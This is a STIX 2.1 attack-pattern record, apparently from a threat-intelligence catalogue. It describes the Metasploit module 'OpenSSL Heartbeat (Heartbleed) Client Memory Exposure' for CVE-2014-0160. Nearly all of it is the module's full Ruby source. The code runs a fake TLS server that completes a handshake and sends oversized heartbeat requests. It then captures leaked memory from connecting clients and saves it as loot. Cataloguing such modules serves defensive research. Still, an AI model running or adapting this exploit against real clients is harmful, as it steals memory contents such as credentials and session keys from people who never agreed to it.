{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--447885a5-dced-4888-a31c-0ac53bb355ea",
    "created": "2024-08-14T16:21:55.681925Z",
    "modified": "2024-08-14T16:21:55.681929Z",
    "name": "OpenSSL Heartbeat (Heartbleed) Client Memory Exposure",
    "description": " This module provides a fake SSL service that is intended to leak memory from client systems as they connect. This module is hardcoded for using the AES-128-CBC-SHA1 cipher. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/server/openssl_heartbeat_client_memory.rb",
            "external_id": "openssl_heartbeat_client_memory.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-0160"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisa.gov/uscert/ncas/alerts/TA14-098A"
        },
        {
            "source_name": "reference",
            "url": "http://heartbleed.com/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::TcpServer\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'           => 'OpenSSL Heartbeat (Heartbleed) Client Memory Exposure',\n      'Description'    => %q{\n        This module provides a fake SSL service that is intended to\n        leak memory from client systems as they connect. This module is\n        hardcoded for using the AES-128-CBC-SHA1 cipher.\n      },\n      'Author'         =>\n        [\n          'Neel Mehta', # Vulnerability discovery\n          'Riku', # Vulnerability discovery\n          'Antti', # Vulnerability discovery\n          'Matti', # Vulnerability discovery\n          'hdm' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'Actions'        => [['Capture', 'Description' => 'Run server to disclose memory from incoming clients']],\n      'PassiveActions' => ['Capture'],\n      'DefaultAction'  => 'Capture',\n      'References'     =>\n        [\n          [ 'CVE', '2014-0160' ],\n          [ 'US-CERT-VU', '720951' ],\n          [ 'URL', 'https://www.cisa.gov/uscert/ncas/alerts/TA14-098A' ],\n          [ 'URL', 'http://heartbleed.com/' ]\n        ],\n      'DisclosureDate' => 'Apr 07 2014',\n      'Notes' =>\n          {\n              'AKA' => ['Heartbleed']\n          }\n\n    )\n\n    register_options(\n      [\n        OptPort.new('SRVPORT',    [ true, \"The local port to listen on.\", 8443 ]),\n        OptInt.new('HEARTBEAT_LIMIT', [true, \"The number of kilobytes of data to capture at most from each client\", 512]),\n        OptInt.new('HEARTBEAT_READ', [true, \"The number of bytes to leak in the heartbeat response\", 65535]),\n        OptBool.new('NEGOTIATE_TLS', [true, \"Set this to true to negotiate TLS and often leak more data at the cost of CA validation\", false])\n      ])\n  end\n\n  # Initialize the client state and RSA key for this session\n  def setup\n    super\n    @state    = {}\n    @cert_key = OpenSSL::PKey::RSA.new(1024){ } if negotiate_tls?\n  end\n\n  # Setup the server module and start handling requests\n  def run\n    print_status(\"Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...\")\n    exploit\n  end\n\n  # Determine how much memory to leak with each request\n  def heartbeat_read_size\n    datastore['HEARTBEAT_READ'].to_i\n  end\n\n  # Determine how much heartbeat data to capture at the most\n  def heartbeat_limit\n    datastore['HEARTBEAT_LIMIT'].to_i * 1024\n  end\n\n  # Determine whether we should negotiate TLS or not\n  def negotiate_tls?\n    !! datastore['NEGOTIATE_TLS']\n  end\n\n  # Initialize a new state for every client\n  def on_client_connect(c)\n    @state[c] = {\n      :name          => \"#{c.peerhost}:#{c.peerport}\",\n      :ip            => c.peerhost,\n      :port          => c.peerport,\n      :heartbeats    => \"\",\n      :server_random => [Time.now.to_i].pack(\"N\") + Rex::Text.rand_text(28)\n    }\n    print_status(\"#{@state[c][:name]} Connected\")\n  end\n\n  # Buffer messages and parse them once they are fully received\n  def on_client_data(c)\n    data = c.get_once\n    return if not data\n    @state[c][:buff] ||= \"\"\n    @state[c][:buff] << data\n    process_request(c)\n  end\n\n  # Extract TLS messages from the buffer and process them\n  def process_request(c)\n\n    # Make this slightly harder to DoS\n    if @state[c][:buff].to_s.length > (1024*128)\n      print_status(\"#{@state[c][:name]} Buffer limit reached, dropping connection\")\n      c.close\n      return\n    end\n\n    # Process any buffered messages\n    loop do\n      break unless @state[c][:buff]\n\n      message_type, message_ver, message_len = @state[c][:buff].unpack(\"Cnn\")\n      break unless message_len\n      break unless @state[c][:buff].length >= message_len+5\n\n      mesg = @state[c][:buff].slice!(0, message_len+5)\n\n      if @state[c][:encrypted]\n        process_openssl_encrypted_request(c, mesg)\n      else\n        process_openssl_cleartext_request(c, mesg)\n      end\n    end\n  end\n\n  # Process cleartext TLS messages\n  def process_openssl_cleartext_request(c, data)\n    message_type, message_version, protocol_version = data.unpack(\"Cn@9n\")\n\n    if message_type == 0x15 and data.length >= 7\n      message_level, message_reason = data[5,2].unpack(\"CC\")\n      print_status(\"#{@state[c][:name]} Alert Level #{message_level} Reason #{message_reason}\")\n      if message_level == 2 and message_reason == 0x30\n        print_status(\"#{@state[c][:name]} Client rejected our certificate due to unknown CA\")\n        return\n      end\n\n      if level == 2\n        print_status(\"#{@state[c][:name]} Client rejected our connection with a fatal error: #{message_reason}\")\n        return\n      end\n\n    end\n\n    unless message_type == 0x18\n      message_code = data[5,1].to_s.unpack(\"C\").first\n      vprint_status(\"#{@state[c][:name]} Message #{sprintf(\"type %.2x v%.4x %.2x\", message_type, message_version, message_code)}\")\n    end\n\n    # Process the Client Hello\n    unless @state[c][:received_hello]\n\n      unless (message_type == 0x16 and data.length > 43 and message_code == 0x01)\n        print_status(\"#{@state[c][:name]} Expected a Client Hello, received #{sprintf(\"type %.2x code %.2x\", message_type, message_code)}\")\n        return\n      end\n\n      print_status(\"#{@state[c][:name]} Processing Client Hello...\")\n\n      # Extract the client_random needed to compute the master key\n      @state[c][:client_random]  = data[11,32]\n      @state[c][:received_hello] = true\n\n      print_status(\"#{@state[c][:name]} Sending Server Hello...\")\n      openssl_send_server_hello(c, data, protocol_version)\n      return\n    end\n\n    # If we are negotiating TLS, handle Client Key Exchange/Change Cipher Spec\n    if negotiate_tls?\n      # Process the Client Key Exchange\n      if message_type == 0x16 and data.length > 11 and message_code == 0x10\n        print_status(\"#{@state[c][:name]} Processing Client Key Exchange...\")\n        premaster_length = data[9, 2].unpack(\"n\").first\n\n        # Extract the pre-master secret in encrypted form\n        if data.length >= 11 + premaster_length\n          premaster_encrypted = data[11, premaster_length]\n\n          # Decrypt the pre-master secret using our RSA key\n          premaster_clear = @cert_key.private_decrypt(premaster_encrypted) rescue nil\n          @state[c][:premaster] = premaster_clear if premaster_clear\n        end\n      end\n\n      # Process the Change Cipher Spec and switch to encrypted communications\n      if message_type == 0x14 and message_code == 0x01\n        print_status(\"#{@state[c][:name]} Processing Change Cipher Spec...\")\n        initialize_encryption_keys(c)\n        return\n      end\n    # Otherwise just start capturing heartbeats in clear-text mode\n    else\n      # Send heartbeat requests\n      if @state[c][:heartbeats].length < heartbeat_limit\n        openssl_send_heartbeat(c, protocol_version)\n      end\n\n      # Process cleartext heartbeat replies\n      if message_type == 0x18\n        vprint_status(\"#{@state[c][:name]} Heartbeat received (#{data.length-5} bytes) [#{@state[c][:heartbeats].length} bytes total]\")\n        @state[c][:heartbeats] << data[5, data.length-5]\n      end\n\n      # Full up on heartbeats, disconnect the client\n      if @state[c][:heartbeats].length >= heartbeat_limit\n        print_status(\"#{@state[c][:name]} Heartbeats received [#{@state[c][:heartbeats].length} bytes total]\")\n        store_captured_heartbeats(c)\n        c.close()\n      end\n    end\n  end\n\n  # Process encrypted TLS messages\n  def process_openssl_encrypted_request(c, data)\n    message_type, message_version, protocol_version = data.unpack(\"Cn@9n\")\n\n    return if @state[c][:shutdown]\n    return unless data.length > 5\n\n    buff = decrypt_data(c, data[5, data.length-5])\n    unless buff\n      print_error(\"#{@state[c][:name]} Failed to decrypt, giving up on this client\")\n      c.close\n      return\n    end\n\n    message_code = buff[0,1].to_s.unpack(\"C\").first\n    vprint_status(\"#{@state[c][:name]} Message #{sprintf(\"type %.2x v%.4x %.2x\", message_type, message_version, message_code)}\")\n\n    if message_type == 0x16\n      print_status(\"#{@state[c][:name]} Processing Client Finished...\")\n    end\n\n    # Send heartbeat requests\n    if @state[c][:heartbeats].length < heartbeat_limit\n      openssl_send_heartbeat(c, protocol_version)\n    end\n\n    # Process heartbeat replies\n    if message_type == 0x18\n      vprint_status(\"#{@state[c][:name]} Encrypted heartbeat received (#{buff.length} bytes) [#{@state[c][:heartbeats].length} bytes total]\")\n      @state[c][:heartbeats] << buff\n    end\n\n    # Full up on heartbeats, disconnect the client\n    if @state[c][:heartbeats].length >= heartbeat_limit\n      print_status(\"#{@state[c][:name]} Encrypted heartbeats received [#{@state[c][:heartbeats].length} bytes total]\")\n      store_captured_heartbeats(c)\n      c.close()\n    end\n  end\n\n  # Dump captured memory to a file on disk using the loot API\n  def store_captured_heartbeats(c)\n    if @state[c][:heartbeats].length > 0\n      begin\n        path = store_loot(\n          \"openssl.heartbleed.client\",\n          \"application/octet-stream\",\n          @state[c][:ip],\n          @state[c][:heartbeats],\n          nil,\n          \"OpenSSL Heartbleed client memory\"\n        )\n        print_good(\"#{@state[c][:name]} Heartbeat data stored in #{path}\")\n      rescue ::Interrupt\n        raise $!\n      rescue ::Exception\n        print_error(\"#{@state[c][:name]} Heartbeat data could not be stored: #{$!.class} #{$!}\")\n      end\n\n      # Report the memory disclosure as a vulnerability on the host\n      report_vuln({\n        :host => @state[c][:ip],\n        :name => self.name,\n        :info => \"Module #{self.fullname} successfully dumped client memory contents\",\n        :refs => self.references,\n        :exploited_at => Time.now.utc\n      }) rescue nil # Squash errors related to ip => 127.0.0.1 and the like\n    end\n\n    # Clear the heartbeat array\n    @state[c][:heartbeats] = \"\"\n    @state[c][:shutdown] = true\n  end\n\n  # Delete the state on connection close\n  def on_client_close(c)\n    # Do we have any pending heartbeats to save?\n    if @state[c][:heartbeats].length > 0\n      store_captured_heartbeats(c)\n    end\n    @state.delete(c)\n  end\n\n  # Send an OpenSSL Server Hello response\n  def openssl_send_server_hello(c, hello, version)\n\n    # If encrypted, use the TLS_RSA_WITH_AES_128_CBC_SHA; otherwise, use the\n    # first cipher suite sent by the client.\n    if @state[c][:encrypted]\n      cipher = \"\\x00\\x2F\"\n    else\n      cipher = hello[46, 2]\n    end\n\n    # Create the Server Hello response\n    extensions =\n      \"\\x00\\x0f\\x00\\x01\\x01\"       # Heartbeat\n\n    server_hello_payload =\n      [version].pack('n') +        # Use the protocol version sent by the client.\n      @state[c][:server_random] +  # Random (Timestamp + Random Bytes)\n      \"\\x00\" +                     # Session ID\n      cipher +                     # Cipher ID (TLS_RSA_WITH_AES_128_CBC_SHA)\n      \"\\x00\" +                     # Compression Method (none)\n      [extensions.length].pack('n') + extensions\n\n    server_hello = [0x02].pack(\"C\") + [ server_hello_payload.length ].pack(\"N\")[1,3] + server_hello_payload\n\n    msg1 = \"\\x16\" + [version].pack('n') + [server_hello.length].pack(\"n\") + server_hello\n    c.put(msg1)\n\n    # Skip the rest of TLS if we arent negotiating it\n    unless negotiate_tls?\n      # Send a heartbeat request to start the stream and return\n      openssl_send_heartbeat(c, version)\n      return\n    end\n\n    # Certificates\n    certs_combined = generate_certificates\n    pay2 = \"\\x0b\" + [ certs_combined.length + 3 ].pack(\"N\")[1, 3] + [ certs_combined.length ].pack(\"N\")[1, 3] + certs_combined\n    msg2 = \"\\x16\" + [version].pack('n') + [pay2.length].pack(\"n\") + pay2\n    c.put(msg2)\n\n    # End of Server Hello\n    pay3 = \"\\x0e\\x00\\x00\\x00\"\n    msg3 = \"\\x16\" + [version].pack('n') + [pay3.length].pack(\"n\") + pay3\n    c.put(msg3)\n  end\n\n  # Send the heartbeat request that results in memory exposure\n  def openssl_send_heartbeat(c, version)\n    c.put \"\\x18\" + [version].pack('n') + \"\\x00\\x03\\x01\" + [heartbeat_read_size].pack(\"n\")\n  end\n\n  # Pack the certificates for use in the TLS reply\n  def generate_certificates\n    certs = []\n    certs << generate_certificate.to_der\n    certs_combined = certs.map { |cert| [ cert.length ].pack(\"N\")[1, 3] + cert }.join\n  end\n\n  # Generate a self-signed certificate to use for the service\n  def generate_certificate\n    key  = @cert_key\n    cert = OpenSSL::X509::Certificate.new\n    cert.version = 2\n    cert.serial  = rand(0xFFFFFFFF)\n\n    subject_cn = Rex::Text.rand_hostname\n    subject = OpenSSL::X509::Name.new([\n        [\"C\",\"US\"],\n        ['ST', Rex::Text.rand_state()],\n        [\"L\", Rex::Text.rand_text_alpha(rand(20) + 10).capitalize],\n        [\"O\", Rex::Text.rand_text_alpha(rand(20) + 10).capitalize],\n        [\"CN\", subject_cn],\n      ])\n    issuer = OpenSSL::X509::Name.new([\n        [\"C\",\"US\"],\n        ['ST', Rex::Text.rand_state()],\n        [\"L\", Rex::Text.rand_text_alpha(rand(20) + 10).capitalize],\n        [\"O\", Rex::Text.rand_text_alpha(rand(20) + 10).capitalize],\n        [\"CN\", Rex::Text.rand_text_alpha(rand(20) + 10).capitalize],\n      ])\n\n    cert.subject = subject\n    cert.issuer = issuer\n    cert.not_before = Time.now - (3600 * 24 * 365) + rand(3600 * 14)\n    cert.not_after = Time.now + (3600 * 24 * 365) + rand(3600 * 14)\n    cert.public_key = key.public_key\n    ef = OpenSSL::X509::ExtensionFactory.new(nil,cert)\n    cert.extensions = [\n      ef.create_extension(\"basicConstraints\",\"CA:FALSE\"),\n      ef.create_extension(\"subjectKeyIdentifier\",\"hash\"),\n      ef.create_extension(\"extendedKeyUsage\",\"serverAuth\"),\n      ef.create_extension(\"keyUsage\",\"keyEncipherment,dataEncipherment,digitalSignature\")\n    ]\n    ef.issuer_certificate = cert\n    cert.add_extension ef.create_extension(\"authorityKeyIdentifier\", \"keyid:always,issuer:always\")\n    cert.sign(key, OpenSSL::Digest.new('SHA1'))\n    cert\n  end\n\n  # Decrypt the TLS message and return the result without the MAC\n  def decrypt_data(c, data)\n    return unless @state[c][:client_enc]\n\n    cipher = @state[c][:client_enc]\n\n    begin\n      buff = cipher.update(data)\n      buff << cipher.final\n\n      # Trim the trailing MAC signature off the buffer\n      if buff.length >= 20\n        return buff[0, buff.length-20]\n      end\n    rescue ::OpenSSL::Cipher::CipherError => e\n      print_error(\"#{@state[c][:name]} Decryption failed: #{e}\")\n    end\n\n    nil\n  end\n\n  # Calculate keys and toggle encrypted status\n  def initialize_encryption_keys(c)\n    tls1_calculate_crypto_keys(c)\n    @state[c][:encrypted] = true\n  end\n\n  # Determine crypto keys for AES-128-CBC based on the master secret\n  def tls1_calculate_crypto_keys(c)\n    @state[c][:master] = tls1_calculate_master_key(c)\n    return unless @state[c][:master]\n\n    key_block = tls1_prf(\n      @state[c][:master],\n      \"key expansion\" +  @state[c][:server_random] + @state[c][:client_random],\n      (20 * 2) + (16 * 4)\n    )\n\n    # Extract the MAC, encryption, and IV from the keyblock\n    @state[c].update({\n      :client_write_mac_key => key_block.slice!(0, 20),\n      :server_write_mac_key => key_block.slice!(0, 20),\n      :client_write_key     => key_block.slice!(0, 16),\n      :server_write_key     => key_block.slice!(0, 16),\n      :client_iv            => key_block.slice!(0, 16),\n      :server_iv            => key_block.slice!(0, 16),\n    })\n\n    client_cipher = OpenSSL::Cipher.new('aes-128-cbc')\n    client_cipher.decrypt\n    client_cipher.key = @state[c][:client_write_key]\n    client_cipher.iv  = @state[c][:client_iv]\n    client_mac = OpenSSL::HMAC.new(@state[c][:client_write_mac_key], OpenSSL::Digest.new('sha1'))\n\n    server_cipher = OpenSSL::Cipher.new('aes-128-cbc')\n    server_cipher.encrypt\n    server_cipher.key = @state[c][:server_write_key]\n    server_cipher.iv  = @state[c][:server_iv]\n    server_mac = OpenSSL::HMAC.new(@state[c][:server_write_mac_key], OpenSSL::Digest.new('sha1'))\n\n    @state[c].update({\n      :client_enc => client_cipher,\n      :client_mac => client_mac,\n      :server_enc => server_cipher,\n      :server_mac => server_mac\n    })\n\n    true\n  end\n\n  # Determine the master key from the premaster and client/server randoms\n  def tls1_calculate_master_key(c)\n    return unless (\n      @state[c][:premaster]     and\n      @state[c][:client_random] and\n      @state[c][:server_random]\n    )\n    tls1_prf(\n      @state[c][:premaster],\n      \"master secret\" + @state[c][:client_random] + @state[c][:server_random],\n      48\n    )\n  end\n\n  # Random generator used to calculate key data for TLS 1.0/1.1\n  def tls1_prf(input_secret, input_label, output_length)\n    # Calculate S1 and S2 as even blocks of each half of the secret\n    # string. If the blocks are uneven, then S1's last byte should\n    # be duplicated by S2's first byte\n    blen = (input_secret.length / 2.0).ceil\n    s1 = input_secret[0, blen]\n    s2_index = blen\n    if input_secret.length % 2 != 0\n      s2_index -= 1\n    end\n    s2 = input_secret[s2_index, blen]\n\n    # Hash the first part with MD5\n    out1 = tls1_p_hash('md5', s1, input_label, output_length).unpack(\"C*\")\n\n    # Hash the second part with SHA1\n    out2 = tls1_p_hash('sha1', s2, input_label, output_length).unpack(\"C*\")\n\n    # XOR the results together\n    [*(0..out1.length-1)].map {|i| out1[i] ^ out2[i] }.pack(\"C*\")\n  end\n\n  # Used by tls1_prf to generate arbitrary amounts of session key data\n  def tls1_p_hash(digest, secret, label, olen)\n    output  = \"\"\n    chunk   = OpenSSL::Digest.new(digest).digest_length\n    ctx     = OpenSSL::HMAC.new(secret, OpenSSL::Digest.new(digest))\n    ctx_tmp = OpenSSL::HMAC.new(secret, OpenSSL::Digest.new(digest))\n\n    ctx.update(label)\n    a1 = ctx.digest\n\n    loop do\n      ctx = OpenSSL::HMAC.new(secret, OpenSSL::Digest.new(digest))\n      ctx_tmp = OpenSSL::HMAC.new(secret, OpenSSL::Digest.new(digest))\n      ctx.update(a1)\n      ctx_tmp.update(a1)\n      ctx.update(label)\n\n      if olen > chunk\n        output << ctx.digest\n        a1 = ctx_tmp.digest\n        olen -= chunk\n      else\n        a1 = ctx.digest\n        output << a1[0, olen]\n        break\n      end\n    end\n\n    output\n  end\nend\n",
    "x_mitre_disclosure_date": "Apr 07 2014"
}